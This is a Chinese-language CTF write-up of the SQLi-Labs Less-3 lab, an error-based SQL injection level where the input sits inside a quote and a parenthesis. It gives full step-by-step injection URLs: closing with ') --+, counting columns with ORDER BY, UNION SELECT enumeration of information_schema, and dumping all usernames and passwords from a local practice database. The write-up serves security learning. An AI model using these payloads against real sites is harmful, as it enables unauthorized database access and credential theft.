【SQLi-Labs】Less-3 带括号闭合的联合查询注入 Writeup

操作者：何芊宏 | 操作日期：2026.10.22 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, MySQL

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-3 (GET - Error based - Single quotes with twist - string)
  • 提示：GET请求，基于报错，字符型注入（带括号扭曲）

2. 解题思路与前置原理

本关的核心考点在于“上下文闭合”。与 Less-1 仅有单引号不同，Less-3 在参数外层额外嵌套了括号。在注入时，不仅需要使用单引号闭合原字符串，还需要提供右括号闭合原语句的逻辑层级，最后使用注释符消除剩余代码，才能保证 UNION 联合查询顺利执行。

3. 操作步骤与解析

第一步：探测注入点与报错分析

输入 URL：http://localhost/sqli-labs-master/Less-3/?id=1'

回显现象：页面抛出 SQL 语法错误：You have an error in your SQL syntax... near ''1'') LIMIT 0,1' at line 1。

解释与原理：观察报错信息中的 near ''1'')。这说明我们输入的 1' 在闭合字符串后，不仅多出了一个单引号，还遇到了一个无法配对的右括号。推断后台 SQL 语句为 SELECT * FROM users WHERE id = ('$id') LIMIT 0,1。

第二步：构造闭合与确定字段数

输入 URL：http://localhost/sqli-labs-master/Less-3/?id=1') --+

回显现象：页面恢复正常，成功回显 Dumb/Dumb。

解释与原理：输入 1') 时，拼装后的语句变为 id = ('1')，单引号和括号均完美闭合。加上 --+ 注释掉后方的 ') LIMIT 0,1，保证语法正确。

验证列数：

输入 URL：http://localhost/sqli-labs-master/Less-3/?id=1') ORDER BY 3 --+ （页面正常）

输入 URL：http://localhost/sqli-labs-master/Less-3/?id=1') ORDER BY 4 --+ （报错：Unknown column '4' in 'order clause'）

确认字段数为 3 个。

第三步：探测回显点

输入 URL：http://localhost/sqli-labs-master/Less-3/?id=-1') UNION SELECT 1,2,3 --+

回显现象：页面回显数字 2 和 3。

解释与原理：使用 -1 占位，让前置查询为空。确认第 2 列和第 3 列的数据会被前端页面渲染。

第四步：获取基础信息与表名

输入 URL：http://localhost/sqli-labs-master/Less-3/?id=-1') UNION SELECT 1,2, group_concat(table_name) FROM information_schema.tables WHERE table_schema='security' --+

回显现象：回显点 3 输出 emails,referrers,uagents,users。

解释与原理：利用联合查询访问系统元数据表，提取当前库的表名。group_concat() 用于合并多行结果。

第五步：获取列名

输入 URL：http://localhost/sqli-labs-master/Less-3/?id=-1') UNION SELECT 1,2, group_concat(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users' --+

回显现象：回显点 3 输出列名 id,username,password。

解释与原理：查询列名信息。此处必须同时限制 table_schema='security' 和 table_name='users'，否则会查出系统自带表中同名的列，造成数据污染和干扰。

第六步：提取最终数据

输入 URL：http://localhost/sqli-labs-master/Less-3/?id=-1') UNION SELECT 1, group_concat(username), group_concat(password) FROM security.users --+

回显现象：页面输出 security 库 users 表下的所有账号及明文密码。

4. 踩坑记录与复盘

  • 闭合符的严格匹配：遇到报错必须仔细分析 near 后面的内容。如果多出了单引号或括号，必须使用对应的符号进行闭环（如本关的 ')）。闭合符不能省略，也不能混用。
  • 命名空间冲突：在查询 information_schema.columns 时，只使用 table_name 限制会导致跨库查询。标准做法是必须配合 table_schema 锁定当前数据库。

5. 知识点总结与工具说明

  • 带括号的字符型注入：原理同普通字符型注入，核心区别在于需要补全右括号来完成语法逻辑的闭环。
  • 工具环境：当前阶段采用纯手工注入，仅依赖浏览器及本地靶场环境。后续涉及自动化脚本或工具的下载与使用，将在对应关卡补充详细的配置步骤与代码解析。
